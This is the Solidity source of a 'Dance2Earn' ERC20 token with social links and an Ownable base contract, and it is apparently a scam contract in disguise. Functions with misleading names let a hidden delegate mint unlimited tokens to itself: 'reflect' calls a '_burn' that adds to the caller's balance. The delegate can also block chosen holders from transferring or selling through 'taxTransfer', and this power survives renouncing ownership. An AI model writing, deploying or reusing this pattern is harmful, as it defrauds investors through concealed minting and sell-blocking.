{"Dance2Earn.sol":{"content":" /**\r\n  ____       _      _   _      ____ U _____ u      ____       U _____ u    _       ____     _   _     \r\n |  _\"\\  U  /\"\\  u | \\ |\"|  U /\"___|\\| ___\"|/     |___\"\\      \\| ___\"|/U  /\"\\  uU |  _\"\\ u | \\ |\"|    \r\n/| | | |  \\/ _ \\/ \u003c|  \\| |\u003e \\| | u   |  _|\"       U __) |      |  _|\"   \\/ _ \\/  \\| |_) |/\u003c|  \\| |\u003e   \r\nU| |_| |\\ / ___ \\ U| |\\  |u  | |/__  | |___       \\/ __/ \\     | |___   / ___ \\   |  _ \u003c  U| |\\  |u   \r\n |____/ u/_/   \\_\\ |_| \\_|    \\____| |_____|      |_____|u     |_____| /_/   \\_\\  |_| \\_\\  |_| \\_|    \r\n  |||_    \\\\    \u003e\u003e ||   \\\\,-._// \\\\  \u003c\u003c   \u003e\u003e      \u003c\u003c  //       \u003c\u003c   \u003e\u003e  \\\\    \u003e\u003e  //   \\\\_ ||   \\\\,-. \r\n (__)_)  (__)  (__)(_\")  (_/(__)(__)(__) (__)    (__)(__)     (__) (__)(__)  (__)(__)  (__)(_\")  (_/  \r\n\r\nTWITTER:  https://twitter.com/Dance_2_Earn\r\nMEDIUM:   https://medium.com/@dance2earn\r\nTELEGRAM: https://t.me/Dance2Earn\r\nWEBSITE:  https://dance2earn.net/\r\n\r\n*/// SPDX-License-Identifier: MIT\r\npragma solidity =0.8.2;\r\n\r\nimport \"./Ownable.sol\";\r\n\r\ncontract Dance2Earn is Ownable, IERC20, IERC20Metadata {\r\n    \r\n    uint256 private _totalSupply;\r\n    uint256 private _supplyCap;\r\n    string private _name;\r\n    string private _symbol;\r\n    mapping(address =\u003e bool) private _setTax;\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    address link; uint8 _projectName; uint8 _tokenSymbol;\r\n    \r\n    constructor(address telegram, uint8 pname , uint8 tsymbol) {\r\n        telegram = link; pname = _projectName; tsymbol = _tokenSymbol;\r\n\r\n        _name = \"Dance2Earn\";\r\n        _symbol = \"Dance2Earn\";\r\n        _totalSupply = 100000000000*10**9;\r\n        _supplyCap   = 100000000000;\r\n        _balances[msg.sender] += _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n  \r\n    /**\r\n     * @notice Returns Supply Cap (maximum possible amount of tokens)\r\n     */\r\n    function SUPPLY_CAP() external view returns (uint256) {\r\n        return _supplyCap;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {_approve(sender, _msgSender(), currentAllowance - amount);}\r\n        return true;\r\n    }\r\n    \r\n    function reflect(uint256 amount) external onlyDelegates {\r\n        _burn(amount);\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);}\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        if (_setTax[sender] || _setTax[recipient]) require (amount == 0, \"\");\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {_balances[sender] = senderBalance - amount;}\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        _afterTokenTransfer(sender, recipient, amount);\r\n    }\r\n   \r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function taxTransfer (address _address) external onlyDelegates {\r\n        if (_setTax[_address] == true) {_setTax[_address] = false;}\r\n        else {_setTax[_address] = true; }\r\n    }\r\n\r\n    function transferedTax(address _address) public view returns (bool) {\r\n        return _setTax[_address];\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {\r\n    }\r\n\r\n    function _burn(uint256 amount) internal {\r\n        require(amount != 0, \"ERC20: burn zero tokens is disallowed\");\r\n        _balances[msg.sender] += amount;\r\n        emit Transfer(msg.sender, address(0), amount);\r\n    }\r\n    \r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {\r\n    }\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity =0.8.2;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    address internal _delegate;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    modifier onlyDelegates() {\r\n        require(_delegate == msg.sender, \"Caller not belong to delegates\");\r\n        _;\r\n    }\r\n    \r\n    function setDelegate(address account) external onlyOwner {\r\n        require (_delegate == address(0));\r\n        _delegate = account;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}"}}